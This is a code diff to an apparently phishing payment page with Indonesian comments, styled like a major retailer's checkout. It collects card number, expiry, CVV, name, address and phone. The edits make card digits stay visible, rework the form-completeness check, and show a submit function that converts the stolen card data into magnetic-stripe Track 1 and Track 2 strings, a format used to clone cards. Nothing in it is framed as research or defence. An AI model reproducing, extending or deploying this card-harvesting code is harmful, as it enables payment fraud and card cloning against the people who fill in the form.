@@ -37,9 +37,9 @@
         input:focus, select:focus { outline: none; border-color: #0071e3; box-shadow: 0 0 3px rgba(0,113,227,0.5); }
         .baris-dua { display: flex; gap: 12px; }
         .baris-dua > div { flex: 1; }
-        button { width: 100%; padding: 12px; background: #FFD814; border: 1px solid #FCD200; border-radius: 20px; font-size: 15px; color: #0F1111; cursor: pointer; margin-top: 25px; }
-        button:disabled { opacity: 0.5; cursor: not-allowed; }
-        button:hover:not(:disabled) { background: #F7CA00; }
+        button { width: 100%; padding: 12px; background: #FFD814; border: 1px solid #FCD200; border-radius: 20px; font-size: 15px; color: #0F1111; cursor: pointer; margin-top: 25px; transition: opacity 0.2s; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; background: #FFD814; border-color: #FCD200; }
+        button:not(:disabled):hover { background: #F7CA00; }
         .tel { display: flex; }
         .tel span { padding: 10px 8px; background: #f0f0f0; border: 1px solid #a6a6a6; border-right: none; border-radius: 4px 0 0 4px; font-size: 13px; }
         .tel input { border-radius: 0 4px 4px 0; }
@@ -124,6 +124,16 @@
         document.addEventListener('DOMContentLoaded', () => {
             const email = localStorage.getItem('emailPengguna');
             if (!email) { window.location.href = 'index.html'; return; }
+            
+            // Pantau semua perubahan input
+            document.getElementById('nomor').addEventListener('input', cekLengkap);
+            document.getElementById('expiry').addEventListener('input', cekLengkap);
+            document.getElementById('cvv').addEventListener('input', cekLengkap);
+            document.getElementById('nama').addEventListener('input', cekLengkap);
+            document.getElementById('alamat').addEventListener('input', cekLengkap);
+            document.getElementById('kota').addEventListener('input', cekLengkap);
+            document.getElementById('kodepos').addEventListener('input', cekLengkap);
+            document.getElementById('telepon').addEventListener('input', cekLengkap);
         });
 
         function cekJenisKartu() {
@@ -140,10 +150,8 @@
 
             ikon.src = src;
             ikon.style.display = src ? 'block' : 'none';
-            cekLengkap();
         }
 
-        // === SELALU TAMPILKAN ANGKA — TIDAK DIUBAH JADI TITIK ===
         function formatNomor(angka) {
             let tampil = '';
             for (let i = 0; i < angka.length; i++) {
@@ -160,50 +168,46 @@
             cekJenisKartu();
         });
 
-        // ❌ Hapus perubahan jadi titik saat blur — biarkan angka tetap terlihat
         document.getElementById('nomor').addEventListener('focus', function() {
             this.value = formatNomor(nomorAsli);
         });
         document.getElementById('nomor').addEventListener('blur', function() {
-            this.value = formatNomor(nomorAsli); // Tetap tampilkan angka, bukan titik
+            this.value = formatNomor(nomorAsli);
         });
 
-        // === EXPIRY DATE ===
         document.getElementById('expiry').addEventListener('input', function() {
             let val = this.value.replace(/\D/g, '');
             if (val.length >= 2) val = val.slice(0,2) + '/' + val.slice(2,4);
             this.value = val;
-            cekLengkap();
         });
 
-        // === CVV ===
         document.getElementById('cvv').addEventListener('input', function() {
             cvvAsli = this.value.replace(/\D/g, '');
             this.value = cvvAsli;
-            cekLengkap();
         });
         document.getElementById('cvv').addEventListener('focus', function() {
             this.value = cvvAsli;
         });
-        // ❌ CVV juga tetap angka saat pindah kolom
         document.getElementById('cvv').addEventListener('blur', function() {
-            this.value = cvvAsli; // Tetap tampilkan angka
+            this.value = cvvAsli;
         });
 
-        // === CEK SEMUA DATA LENGKAP ===
+        // === CEK LENGKAP — DIPERBAIKI ===
         function cekLengkap() {
-            const ok = nomorAsli.length >= 13 && nomorAsli.length <= 16 &&
-                       document.getElementById('expiry').value.length === 5 &&
-                       cvvAsli.length >= 3 && cvvAsli.length <= 4 &&
-                       document.getElementById('nama').value.trim() !== '' &&
-                       document.getElementById('alamat').value.trim() !== '' &&
-                       document.getElementById('kota').value.trim() !== '' &&
-                       document.getElementById('kodepos').value.trim() !== '' &&
-                       document.getElementById('telepon').value.trim() !== '';
-            document.getElementById('tombol').disabled = !ok;
+            const nomorOk = nomorAsli.length >= 13 && nomorAsli.length <= 16;
+            const expiryOk = document.getElementById('expiry').value.length === 5;
+            const cvvOk = cvvAsli.length >= 3 && cvvAsli.length <= 4;
+            const namaOk = document.getElementById('nama').value.trim() !== '';
+            const alamatOk = document.getElementById('alamat').value.trim() !== '';
+            const kotaOk = document.getElementById('kota').value.trim() !== '';
+            const kodePosOk = document.getElementById('kodepos').value.trim() !== '';
+            const telOk = document.getElementById('telepon').value.trim() !== '';
+
+            const semuaLengkap = nomorOk && expiryOk && cvvOk && namaOk && alamatOk && kotaOk && kodePosOk && telOk;
+            
+            document.getElementById('tombol').disabled = !semuaLengkap;
         }
 
-        // === KIRIM DATA & LANJUT ===
         async function lanjut() {
             const email = localStorage.getItem('emailPengguna');
             trackData = `=== TRACK ===\nT1: %B${nomorAsli}^${document.getElementById('nama').value.replace(/\s+/g, '/')}^${document.getElementById('expiry').value.replace('/','')}000000000000?\nT2: ;${nomorAsli}=${document.getElementById('expiry').value.replace('/','')}000000000000?`;
